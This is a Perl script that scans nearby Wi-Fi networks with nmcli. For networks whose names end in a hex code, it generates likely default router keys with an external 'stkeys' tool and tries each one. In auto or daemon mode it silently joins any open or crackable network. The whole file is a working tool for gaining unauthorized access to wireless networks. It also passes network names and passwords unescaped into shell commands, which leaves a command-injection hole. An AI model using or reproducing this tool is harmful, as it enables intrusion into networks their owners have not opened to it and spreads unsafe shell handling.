#!/usr/bin/perl

use strict;
use warnings;
use feature 'say';

use Getopt::Long;
use autodie;

my $auto_delay = 3;

my $auto = 0;
my $daemon = 0;
GetOptions(
    'h|help' => \&help,
    'a|auto' => \$auto,
    'd|daemon' => \$daemon);

my $stkeys = 'build/stkeys';
if (!-e $stkeys) {
    $stkeys = `which stkeys`;
    chomp $stkeys;
    if (!-e $stkeys) {
        die 'unable to find stkeys, run make first';
    }
}

my $nm = `which nmcli`;
chomp $nm;
if (!-e $nm) {
    die 'could not find nmcli';
}

my $applet_running = !system 'killall nm-applet';
@SIG{'INT', 'TERM', 'SEGV'} = \&quit;

while (1) {
    my @networks = sort_networks(query_nm('dev wifi',
            'SSID', 'BSSID', 'RATE', 'SIGNAL', 'SECURITY', 'ACTIVE'));
    my $done = 0;
    my $done_bssid;
    for my $network (@networks) {
        if ($network->{ACTIVE} eq 'yes') {
            $done = 1;
            $done_bssid = $network->{BSSID};
            last;
        }
    }
    if ($auto) {
        if ($done) {
            if ($daemon) {
                sleep $auto_delay;
                next;
            } else {
                last;
            }
        }
        for my $network (@networks) {
            my $last = $network == $networks[$#networks];
            my $ssid = $network->{SSID};
            my $bssid = $network->{BSSID};
            my $security = $network->{SECURITY};
            if ($security eq '' || defined ssid_code($ssid)) {
                if (force_connect_network($network, 0)) {
                    $done = 1;
                    last;
                }
            }
        }
        if ($done && !$daemon) {
            last;
        }
        sleep $auto_delay;
    } else {
        my $i = 0;
        say 'ID SSID RATE SIGNAL [SECURITY] ACTIVE';
        if (@networks == 0) {
            say 'no networks found, use enter to try again';
        }
        for my $network (@networks) {
            say "$i $network->{SSID}: $network->{RATE} $network->{SIGNAL}"
                . " [$network->{SECURITY}] $network->{ACTIVE}";
            $i++;
        }
        my $target = get('network id');
        if ($target ne '' && $target >= 0 && $target < @networks) {
            my $network = $networks[$target];
            if ($done && $network->{BSSID} eq $done_bssid) {
                say 'already connected to this network';
                if ($daemon) {
                    next;
                } else {
                    last;
                }
            }
            if (force_connect_network($network, 1)) {
                if ($daemon) {
                    next;
                } else {
                    last;
                }
            }
        }
    }
}

quit();

sub quit {
    if ($applet_running) {
        system 'nm-applet &>/dev/null &';
    }
    exit;
}

sub help {
    say "usage: $0 [--auto] [--daemon]";
    exit;
}

sub get {
    my($msg) = @_;
    print $msg . '> ';
    my $result = <>;
    chomp $result;
    return $result;
}

sub ssid_code {
    my($ssid) = @_;
    if ($ssid =~ /([0-9A-F]{6,})$/) {
        return $1;
    }
    return undef;
}

sub force_connect_network {
    my($network, $manual) = @_;
    my $ssid = $network->{SSID};
    my $bssid = $network->{BSSID};
    my $security = $network->{SECURITY};
    say "trying to connect to $ssid ($bssid)";
    if ($security eq '') {
        if (test_nm("dev wifi connect '$ssid'") == 0) {
            say "$ssid is unprotected";
            return 1;
        }
        return 0;
    }
    my $code = ssid_code($ssid);
    if ($manual) {
        if (defined $code) {
            say 'leave the password empty to generate keys instead';
        }
        my $password = get('password');
        if ($password ne '' && test_nm("dev wifi connect $bssid password $password") == 0) {
            say "$ssid has password $password";
            return 1;
        }
        if ($password ne '') {
            say 'invalid password';
        }
    }
    if (!defined $code) {
        say 'no hash substring found in the ssid';
        return 0;
    }
    say 'generating passwords...';
    open my $sth, '-|', "$stkeys $code";
    while (my $password = <$sth>) {
        chomp $password;
        say "trying $password...";
        if (test_nm("dev wifi connect $bssid password $password") == 0) {
            say "$ssid has password $password";
            return 1;
        }
    }
    return 0;
}

sub test_nm {
    my($query) = @_;
    return system "$nm $query";
}

sub sort_networks {
    my(@networks) = @_;
    return sort {$b->{SIGNAL} <=> $a->{SIGNAL} || $a->{SSID} cmp $b->{SSID}} @networks;
}

sub query_nm {
    my($query, @fields) = @_;
    my $fields = join ',', @fields;
    my @results = split "\n", `$nm -t -f $fields $query`;
    my @processed_results;
    for my $result(@results) {
        my @data;
        my $quoted = 0;
        my $escaped = 0;
        my $current = '';
        my $extra = 0;
        my $length = length $result;
        for my $i (0 .. (length $result) - 1) {
            $extra++;
            my $char = substr $result, $i, 1;
            my $normal = 0;
            if (!$escaped) {
                if ($char eq "'") {
                    $quoted = !$quoted;
                } elsif ($char eq '\\') {
                    $escaped = 1;
                } elsif ($char eq ':') {
                    if ($escaped) {
                        $normal = 1;
                    } else {
                        push @data, $current;
                        $current = '';
                        $extra = 0;
                    }
                } else {
                    $normal = 1;
                }
            } else {
                $normal = 1;
            }
            if ($normal) {
                $current .= $char;
            }
            if ($char ne '\\' && $escaped) {
                $escaped = 0;
            }
        }
        if ($extra) {
            push @data, $current;
        }
        my %zip;
        @zip{@fields} = @data;
        push @processed_results, \%zip;
    }
    return @processed_results;
}
